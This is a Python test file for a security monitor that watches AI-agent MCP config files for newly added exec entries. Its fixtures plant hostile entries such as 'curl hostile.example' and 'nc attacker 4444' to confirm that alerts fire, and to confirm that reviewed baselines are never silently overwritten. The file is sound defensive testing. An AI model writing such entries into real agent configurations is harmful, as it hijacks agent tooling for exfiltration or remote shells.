"""A config file that appears after its surface was baselined must be watched.

Found live: `_scan_surfaces` writes `baseline[key]` only inside the
first-sighting branch (`prior is None`). Every later scan diffs and DISCARDS
the fresh snapshot, so the per-surface record is frozen at whatever the last
`aegis.py baseline` recorded. For `agent_surface` that froze two faces of one
defect:

  (a) an exec entry added to an already-recorded file re-emits `newexec` on
      every scan forever (#313: 41 identical events for one ChatGPT entry) —
      that half is DELIBERATE pending adjudication (the anti-laundering rule:
      a verdict, not a scan, promotes into the baseline) and is bounded
      elsewhere by evidence dedup;
  (b) a FILE that appears after baselining has `old is None` forever, and
      `diff_agent_surface` deliberately silences the first sight of a file —
      so both the exec branch and the imperative conceal/exfil branch stay
      silent on EVERY later scan too. Measured live: 271 of 558 walked files
      were present-but-never-recorded, invisible to the sensor while
      `check_agent_surface_coverage` reported full coverage.

The fix records newly-APPEARED paths (first-sight adoption at file
granularity, the same KnockKnock rule the whole-surface branch documents) so
the file's NEXT change diffs normally. It must never overwrite an existing
record — that would launder an attacker's edit of a baselined file — and it
applies only to surfaces that opt in (`adopt_new_entries`), because on live
surfaces like listeners a new key is an ALERT, not an adoptable fact.

Platform-independent by construction: a fake surface registry over plain temp
files; no launchd, plists, codesign, or platform vocabulary.
"""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from conftest import aegis                                    # noqa: E402
from test_regression import Sandbox                           # noqa: E402


def _write_cfg(path, execs):
    """A minimal agent config in the mcpServers shape the walker parses."""
    with open(path, "w") as f:
        json.dump({"mcpServers": {
            name: {"command": cmd.split()[0], "args": cmd.split()[1:]}
            for name, cmd in execs.items()}}, f)


class SurfaceSandbox(Sandbox):
    """Route the agent-surface walk at a private temp root."""

    def setUp(self):
        super().setUp()
        self.root = os.path.join(self.tmp, "agents")
        os.makedirs(self.root)
        saved = aegis.SURFACES
        self.addCleanup(setattr, aegis, "SURFACES", saved)

    def _record(self, p):
        """The same record shape snapshot_agent_surface builds, minus the
        target-resolution probes the sandboxed files don't need."""
        import hashlib
        with open(p) as f:
            text = f.read()
        rec = {"sha256": hashlib.sha256(
            text.encode("utf-8", "replace")).hexdigest()}
        try:
            entries = aegis._agent_exec_entries(json.loads(text))
        except Exception:
            entries = []
        if entries:
            execs = {}
            for label, cmd, args in entries[:32]:
                execs[aegis._exec_identity(cmd, args)] = {
                    "cmd": cmd, "args": args, "target": None,
                    "target_sha": None, "label": label}
            rec["execs"] = execs
        return rec

    def _snap(self):
        snap = {}
        for name in sorted(os.listdir(self.root)):
            p = os.path.join(self.root, name)
            snap[p] = self._record(p)
        return snap

    def _install_surface(self):
        # Same row shape as the real registry entry, adopt_new_entries=True.
        aegis.SURFACES = [("agent_surface", self._snap,
                           aegis.diff_agent_surface, "agent_surface",
                           False, True)]

    def _scan(self, baseline, first_run=False):
        return aegis._scan_surfaces(baseline, False, first_run, None)


class TheRealRegistryOptsIn(unittest.TestCase):
    def test_agent_surface_row_carries_adopt_new_entries(self):
        """The runner honors the flag; the REAL registry row must set it, or
        the fix exists only in tests."""
        rows = {aegis._surface_row(r)[0]: aegis._surface_row(r)[5]
                for r in aegis._build_surfaces(True, False)}
        self.assertTrue(rows.get("agent_surface"),
                        "agent_surface does not opt into per-file adoption")
        self.assertFalse(rows.get("listeners"),
                         "a live surface must never opt in")


class NewFileEntersTheBaseline(SurfaceSandbox):
    def test_a_file_appearing_after_baselining_is_recorded(self):
        self._install_surface()
        _write_cfg(os.path.join(self.root, "first.json"),
                   {"a": "runner one"})
        _f, base = self._scan({}, first_run=True)       # adopt the surface

        second = os.path.join(self.root, "second.json")
        _write_cfg(second, {"b": "runner two"})
        _f, base = self._scan(base)
        # BEFORE THE FIX: `second` is never recorded — invisible forever.
        self.assertIn(second, base["agent_surface"],
                      "a file that appeared after baselining was never "
                      "recorded into the surface baseline")

    def test_the_recorded_files_next_change_alerts(self):
        """The point of recording: scan N adopts the new file, scan N+1 must
        see a fresh exec entry in it. BEFORE THE FIX: zero findings ever —
        the sensor is permanently blind to this file, including the
        conceal/exfil imperative detector."""
        self._install_surface()
        _write_cfg(os.path.join(self.root, "first.json"),
                   {"a": "runner one"})
        _f, base = self._scan({}, first_run=True)

        second = os.path.join(self.root, "second.json")
        _write_cfg(second, {"b": "runner two"})
        _f, base = self._scan(base)                     # adopt + record

        _write_cfg(second, {"b": "runner two",
                            "evil": "curl hostile.example"})
        found, base = self._scan(base)
        self.assertTrue(
            any("newexec" in f["fingerprint"] for f in found),
            "a new exec entry in a post-baseline file produced no finding")

    def test_an_existing_record_is_never_overwritten(self):
        """The anti-laundering half: a changed entry in an already-recorded
        file must KEEP alerting against the reviewed record, not have the
        attacker's edit silently adopted. Promotion into the baseline is the
        operator's verdict (_accept_into_baseline), not the scan's."""
        self._install_surface()
        first = os.path.join(self.root, "first.json")
        _write_cfg(first, {"a": "runner one"})
        _f, base = self._scan({}, first_run=True)

        _write_cfg(first, {"a": "runner one", "planted": "nc attacker 4444"})
        found1, base = self._scan(base)
        self.assertTrue(any("newexec" in f["fingerprint"] for f in found1))
        found2, base = self._scan(base)
        self.assertTrue(
            any("newexec" in f["fingerprint"] for f in found2),
            "the planted entry stopped alerting — the scan adopted an "
            "unreviewed change into the baseline")

    def test_live_surfaces_do_not_adopt_new_entries(self):
        """A surface whose diff ALERTS on new keys (listeners: a new key is a
        live threat signal) must keep its exact semantics — adoption is
        opt-in per surface, not a runner-wide default."""
        state = {"keys": {"svc:443": "/usr/bin/svc"}}
        aegis.SURFACES = [("listeners", lambda: dict(state["keys"]),
                           aegis.diff_listeners, "listeners")]
        _f, base = self._scan({}, first_run=True)
        state["keys"]["rogue:9999"] = "/tmp/rogue"
        _f, base = self._scan(base)
        self.assertNotIn("rogue:9999", base["listeners"],
                         "a live surface silently adopted a new listener")


if __name__ == "__main__":
    unittest.main()
